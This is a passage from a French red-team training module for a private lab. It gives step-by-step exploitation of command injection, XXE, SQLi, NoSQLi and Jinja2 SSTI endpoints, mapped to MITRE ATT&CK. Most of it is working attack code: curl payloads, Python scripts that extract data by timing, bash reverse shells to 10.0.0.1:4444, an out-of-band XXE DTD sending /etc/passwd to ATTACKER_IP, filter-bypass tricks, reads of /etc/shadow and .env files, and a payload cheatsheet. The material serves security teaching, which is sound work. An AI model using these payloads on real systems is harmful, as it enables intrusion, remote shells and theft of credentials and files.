curl -s http://localhost:8080/api/ping -d "host=8.8.8.8"

# Test opérateur ;
curl -s http://localhost:8080/api/ping -d "host=8.8.8.8; id"

# Test opérateur &&
curl -s http://localhost:8080/api/ping -d "host=8.8.8.8 && id"

# Test substitution $()
curl -s http://localhost:8080/api/ping -d "host=$(whoami)"
```

#### Étape 2 : Blind time-based

```bash
# Mesurer le temps de réponse
time curl -s http://localhost:8080/api/ping -d "host=8.8.8.8"
time curl -s http://localhost:8080/api/ping -d "host=8.8.8.8; sleep 5"
```

Si la deuxième requête prend ~5 secondes, la commande `sleep 5` a été exécutée.

#### Étape 3 : Extraction de données

```bash
# Extraire le nom d'utilisateur caractère par caractère (time-based)
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; if [ \$(whoami | cut -c1) = 'r' ]; then sleep 5; fi"

# Extraction avec grep
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; if whoami | grep -q '^r'; then sleep 5; fi"
```

#### Étape 4 : Script d'extraction

```python
#!/usr/bin/env python3
"""
Time-based command injection extractor
Cible : http://localhost:8080/api/ping
"""

import requests
import string
import sys

TARGET = "http://localhost:8080/api/ping"
DELAY = 3

def test_command(cmd):
    """Teste une condition via time-based."""
    try:
        r = requests.post(TARGET, data={"host": cmd}, timeout=DELAY + 2)
        return r.elapsed.total_seconds() >= DELAY
    except:
        return True

def extract_command_output(command_template, charset=string.printable, max_len=64):
    """Extrait la sortie d'une commande caractère par caractère."""
    extracted = ""
    for pos in range(1, max_len + 1):
        found = False
        for c in charset:
            escaped_c = c.replace("'", "'\\''")  # protection single quote
            cmd = (
                f"8.8.8.8; if [ \"$(echo $({command_template}) | cut -c{pos})\" = '{escaped_c}' ]"
                f"; then sleep {DELAY}; fi"
            )
            if test_command(cmd):
                extracted += c
                print(f"[+] Position {pos} : '{c}' => {extracted}")
                found = True
                break
        if not found:
            break
    return extracted

if __name__ == "__main__":
    print("[*] Extraction du nom d'utilisateur...")
    user = extract_command_output("whoami")
    print(f"[+] Utilisateur : {user}")

    print("[*] Extraction du hostname...")
    hostname = extract_command_output("hostname")
    print(f"[+] Hostname : {hostname}")

    print("[*] Extraction de l'IP...")
    ip = extract_command_output("hostname -I")
    print(f"[+] IP : {ip}")
```

#### Étape 5 : Reverse shell

```bash
# Sur la machine attaquante
nc -lvnp 4444

# Dans l'injection (Adapter l'IP)
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
```

#### Étape 6 : Bypass de filtres basiques

```bash
# Si ";" est filtré, utiliser un saut de ligne encodé
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8%0aid"

# Si les espaces sont filtrés, utiliser ${IFS}
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8%0aid"  # %0A = newline

# Si "sleep" est filtré, utiliser une alternative
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; timeout 5 bash -c 'while true; do :; done'"

# Utiliser des wildcards
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; /b??/c?t /etc/passwd"

# Utiliser des variables d'environnement
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; $0 -c 'id'"

# Hex encoding
curl -s http://localhost:8080/api/ping \
  -d "host=8.8.8.8; echo 6964 | xxd -r -p | bash"
```

---

## 6. XXE — XML External Entity (T1190)

### MITRE ATT&CK

| ID | Nom | Description |
|----|-----|-------------|
| **T1190** | Exploit Public-Facing Application | Exploitation d'une injection XXE pour lire des fichiers ou exfiltrer des données |
| **TA0010** | Exfiltration | Exfiltration de données via XXE out-of-band |

### 6.1 Payload classique (lecture de fichier)

#### Lecture de fichier

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

#### Lecture avec wrapper PHP (si PHP)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

#### SSRF via XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
  <data>&xxe;</data>
</root>
```

### 6.2 Blind XXE out-of-band avec DTD distant

Quand la réponse n'affiche pas le contenu de l'entité (blind XXE), on utilise un canal externe.

#### Serveur HTTP attaquant (pour recevoir l'exfiltration)

```bash
# Sur la machine attaquante : lancer un serveur HTTP
python3 -m http.server 9999

# Ou utiliser un webhook (interactsh, webhook.site, etc.)
```

#### Payload XXE OOB avec DTD distant

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:9999/evil.dtd">
  %xxe;
]>
<root>
  <data>test</data>
</root>
```

#### Fichier `evil.dtd` (sur le serveur attaquant)

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:9999/?data=%file;'>">
%eval;
%exfil;
```

**Explication :**
1. Le DTD distant définit `%file` qui lit `/etc/passwd`
2. `%eval` construit dynamiquement une nouvelle entité `%exfil`
3. `%exfil` envoie le contenu du fichier au serveur attaquant

#### Param Entity — Syntaxe

| Syntaxe | Signification |
|---------|---------------|
| `<!ENTITY xxe SYSTEM "..">` | Entité standard (référencée par `&xxe;`) |
| `<!ENTITY % xxe SYSTEM "..">` | Entité paramètre (référencée par `%xxe;`) — utilisable uniquement dans la DTD |
| `&#x25;` | Encodage hexadécimal de `%` (permet la construction dynamique d'entités) |

### 6.3 TP Guidé — Endpoint `/api/upload-xml` (POST XML)

#### Étape 1 : Détection

```bash
# Envoyer un XML valide
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><root><data>test</data></root>'
```

#### Étape 2 : Test de lecture de fichier

```bash
# Essayer de lire /etc/passwd
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>'
```

Si le fichier est affiché dans la réponse, l'XXE est confirmé.

#### Étape 3 : Lecture d'autres fichiers

```bash
# Lire le code source de l'application
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/app.py">
]>
<root><data>&xxe;</data></root>'

# Lire la configuration
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/config.py">
]>
<root><data>&xxe;</data></root>'
```

#### Étape 4 : Blind XXE out-of-band

```bash
# 1. Démarrer un serveur HTTP sur la machine attaquante
# Terminal 1 :
python3 -m http.server 9999

# 2. Créer le fichier evil.dtd dans le répertoire courant
cat > /tmp/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:9999/?data=%file;'>">
%eval;
%exfil;
EOF

# 3. Déplacer le DTD sur le serveur HTTP
cd /tmp && python3 -m http.server 9999

# 4. Envoyer le payload XXE OOB
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:9999/evil.dtd">
  %xxe;
]>
<root><data>test</data></root>'
```

**Résultat attendu** : le serveur HTTP de l'attaquant reçoit une requête du type :

```
GET /?data=nom-du-hostname HTTP/1.1
```

#### Étape 5 : SSRF via XXE

```bash
# Scanner les ports internes
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:3306">
]>
<root><data>&xxe;</data></root>'

# Tester d'autres ports internes
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:6379">
]>
<root><data>&xxe;</data></root>'
```

#### Étape 6 : Script d'automatisation

```python
#!/usr/bin/env python3
"""
XXE file extractor
Cible : http://localhost:8080/api/upload-xml
"""

import requests
import sys

TARGET = "http://localhost:8080/api/upload-xml"

def read_file(filepath):
    """Tente de lire un fichier via XXE."""
    xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{filepath}">
]>
<root><data>&xxe;</data></root>"""

    headers = {"Content-Type": "application/xml"}
    r = requests.post(TARGET, data=xml_payload, headers=headers)
    return r.text

if __name__ == "__main__":
    files_to_read = [
        "/etc/passwd",
        "/etc/hostname",
        "/etc/shadow",
        "/app/app.py",
        "/app/config.py",
        "/app/.env",
        "/proc/1/cmdline",
        "/proc/environ",
    ]

    for f in files_to_read:
        print(f"[*] Lecture de {f}...")
        result = read_file(f)
        print(f"[+] Résultat :\n{result[:500]}")
        print("-" * 50)
```

---

## 7. TP Synthèse

### 7.1 Objectif

Enchaîner SQLi + NoSQLi + SSTI sur le lab pour :
1. Cartographier tous les endpoints vulnérables
2. Associer chaque vulnérabilité à son TXXXX MITRE
3. Extraire des données et exécuter des commandes
4. Remplir un rapport de synthèse

### 7.2 Inventaire des endpoints

```bash
# Scan systématique des endpoints
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,json

# Scan des paramètres
ffuf -u http://localhost:8080/api/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 50

# Vérification manuelle des endpoints découverts
ENDPOINTS=(
  "/api/transactions"
  "/api/login"
  "/api/export"
  "/api/ping"
  "/api/upload-xml"
  "/admin/templates"
  "/admin"
  "/api/users"
  "/api/products"
  "/api/search"
)

for ep in "${ENDPOINTS[@]}"; do
  echo "=== $ep ==="
  curl -s -o /dev/null -w "Status: %{http_code}\n" "http://localhost:8080$ep"
done
```

### 7.3 Cartographie MITRE

| Endpoint | Méthode | Paramètre | Vulnérabilité | MITRE | Impact |
|----------|---------|-----------|---------------|-------|--------|
| `/api/transactions` | GET | `filter` | SQLi (Time-based) | T1190 | Extraction de la base |
| `/api/login` | POST | JSON body | NoSQLi ($ne, $regex) | T1190 | Bypass auth |
| `/api/export` | POST | `collection`, `filter` | NoSQLi ($regex, $where) | T1190 | Extraction complète |
| `/api/ping` | POST | `host` | Command Injection | T1059.004 | RCE |
| `/api/upload-xml` | POST | XML body | XXE | T1190 | Lecture fichiers, SSRF |
| `/admin/templates` | POST | `template` | SSTI (Jinja2) | T1190 | RCE |

### 7.4 Tableau de synthèse

| Vulnérabilité | Endpoint | Technique | Niveau difficulté | Extraction | RCE possible |
|---------------|----------|-----------|:-----------------:|:----------:|:------------:|
| SQLi Time-based | `/api/transactions?filter=` | `SLEEP()` + binaire | ⭐⭐⭐ | Oui (DB) | Via `INTO OUTFILE` |
| NoSQLi Auth Bypass | `/api/login` (POST JSON) | `$ne`, `$gt` | ⭐ | Oui (utilisateurs) | Non |
| NoSQLi Blind | `/api/export` (POST JSON) | `$regex` | ⭐⭐ | Oui (collection) | Via `$where` |
| SSTI Jinja2 | `/admin/templates` (POST form) | `cycler.__init__.__globals__` | ⭐⭐⭐ | Oui (config) | Oui (RCE directe) |
| Command Injection | `/api/ping` (POST form) | `;`, `$(cmd)` | ⭐ | Oui (time-based) | Oui (RCE directe) |
| XXE | `/api/upload-xml` (POST XML) | `<!ENTITY>` | ⭐⭐ | Oui (fichiers) | SSRF, RCE (expect) |

### 7.5 Exercice guidé — Enchaînement complet

#### Phase 1 : Reconnaissance

```bash
# 1. Identifier les technologies
curl -sI http://localhost:8080 | grep -iE 'server|x-powered-by|set-cookie'

# 2. Scanner les endpoints
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt -t 50

# 3. Cartographier les méthodes
for method in GET POST PUT DELETE OPTIONS PATCH; do
  echo "=== $method /api/transactions ==="
  curl -s -X $method -o /dev/null -w "Status: %{http_code}\n" http://localhost:8080/api/transactions
done
```

#### Phase 2 : Injection SQL (T1190)

```bash
# 1. Time-based detection
time curl -s "http://localhost:8080/api/transactions?filter=1'%20OR%20SLEEP(3)%20--%20-"

# 2. Extraire la version
sqlmap -u "http://localhost:8080/api/transactions?filter=1" --technique=T --batch --dbms=mysql --dbs

# 3. Dump des credentials
sqlmap -u "http://localhost:8080/api/transactions?filter=1" --technique=T --batch -D lab -T users --dump
```

#### Phase 3 : NoSQL Injection (T1190)

```bash
# 1. Bypass d'authentification
curl -s http://localhost:8080/api/login -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# 2. Extraire les données utilisateur
curl -s http://localhost:8080/api/export -H "Content-Type: application/json" \
  -d '{"collection": "users", "filter": {"username": {"$regex": ".*"}}}'

# 3. Tester $where pour RCE
curl -s http://localhost:8080/api/export -H "Content-Type: application/json" \
  -d '{"collection": "users", "filter": {"$where": "this.constructor.constructor(\"return process.env\")()"}}'
```

#### Phase 4 : SSTI — RCE (T1190)

```bash
# 1. Détection
curl -s http://localhost:8080/admin/templates -d "template={{7*7}}"

# 2. RCE avec cycler
curl -s http://localhost:8080/admin/templates \
  -d "template={{ cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read() }}"

# 3. Reverse shell
curl -s http://localhost:8080/admin/templates \
  -d "template={{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"').read() }}"
```

#### Phase 5 : Command Injection (T1059.004)

```bash
# 1. Détection time-based
time curl -s http://localhost:8080/api/ping -d "host=8.8.8.8; sleep 3"

# 2. Liste des fichiers
curl -s http://localhost:8080/api/ping -d "host=8.8.8.8; ls -la"

# 3. Exfiltration
curl -s http://localhost:8080/api/ping -d "host=8.8.8.8; cat /app/flag.txt"
```

#### Phase 6 : XXE — Lecture fichiers (T1190)

```bash
# 1. Lecture de fichier
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
<root><data>&xxe;</data></root>'

# 2. SSRF interne
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:3306">]>
<root><data>&xxe;</data></root>'
```

### 7.6 Rapport de synthèse à remplir

```markdown
# Rapport de synthèse — Module 2

## Cible : http://localhost:8080
## Date : JJ/MM/2026
## Auteur : [Votre nom]

---

### 1. SQL Injection (T1190)
- **Endpoint** : /api/transactions?filter=
- **Type** : Time-based blind MySQL
- **Payload utilisé** : `1' OR SLEEP(3) -- -`
- **Bases extraites** : [______]
- **Données sensibles** : [______]

### 2. NoSQL Injection (T1190)
- **Endpoint** : /api/login, /api/export
- **Opérateurs utilisés** : [______]
- **Collections extraites** : [______]
- **Mots de passe trouvés** : [______]

### 3. SSTI (T1190)
- **Endpoint** : /admin/templates
- **Moteur** : Jinja2
- **Payload RCE** : [______]
- **Flag / donnée extraite** : [______]

### 4. Command Injection (T1059.004)
- **Endpoint** : /api/ping
- **Payload** : [______]
- **Commande exécutée** : [______]

### 5. XXE (T1190)
- **Endpoint** : /api/upload-xml
- **Fichier lu** : [______]
- **SSRF vers** : [______]

---

### Résumé des accès obtenus

| Niveau d'accès | Obtenu ? | Commentaire |
|----------------|----------|-------------|
| Accès base de données | Oui/Non | |
| Contournement authentification | Oui/Non | |
| Exécution de commandes | Oui/Non | |
| Reverse shell | Oui/Non | |
| Lecture fichiers | Oui/Non | |
```

---

## 8. Annexes

### 8.1 Cheatsheet — Payloads rapides

#### SQLi (Time-based)

```sql
-- MySQL
1' OR SLEEP(5) --
1' AND IF(1=1,SLEEP(5),0) --

-- PostgreSQL
1' OR (SELECT pg_sleep(5)) --
1' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END) --

-- MSSQL
1'; WAITFOR DELAY '0:0:5' --
1'; IF (1=1) WAITFOR DELAY '0:0:5' --
```

#### NoSQL (MongoDB)

```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
{"$where": "sleep(5000)"}
{"collection": "users", "filter": {"$where": "1"}}
```

#### SSTI (Jinja2)

```jinja
{{ 7*7 }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

#### Command Injection

```bash
; id
&& id
| id
$(id)
`id`
```

#### XXE

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://EVIL/evil.dtd"> %xxe;]>
```

### 8.2 Outils recommandés

| Outil | Utilité | Installation |
|-------|---------|-------------|
| **sqlmap** | SQLi automatisée | `apt install sqlmap` ou `git clone` |
| **NoSQLMap** | NoSQLi automatisée | `git clone https://github.com/codingo/NoSQLMap.git` |
| **Burp Suite** | Proxy d'interception | `apt install burpsuite` |
| **Gobuster** | Brute-force d'endpoints | `apt install gobuster` |
| **FFUF** | Fuzzing rapide | `apt install ffuf` |
| **tplmap** | SSTI automatisée | `git clone https://github.com/epinna/tplmap.git` |
| **Interactsh** | OOB réception | Client OOB (ProjectDiscovery) |

### 8.3 Ressources complémentaires

- **OWASP Injection Cheatsheet** : https://cheatsheetseries.owasp.org/
- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks — Injection** : https://book.hacktricks.xyz/
- **PortSwigger Research — SSTI** : https://portswigger.net/research/server-side-template-injection
- **sqlmap Wiki** : https://github.com/sqlmapproject/sqlmap/wiki
- **MITRE ATT&CK — T1190** : https://attack.mitre.org/techniques/T1190/
- **MITRE ATT&CK — T1059.004** : https://attack.mitre.org/techniques/T1059/004/

---

> **Document créé pour le parcours Red Team — Module 2**  
> Ce document est destiné à un usage pédagogique dans le cadre d'un lab privé.  
> N'utilisez ces techniques que sur des systèmes dont vous êtes propriétaire ou pour lesquels vous avez une autorisation écrite explicite.
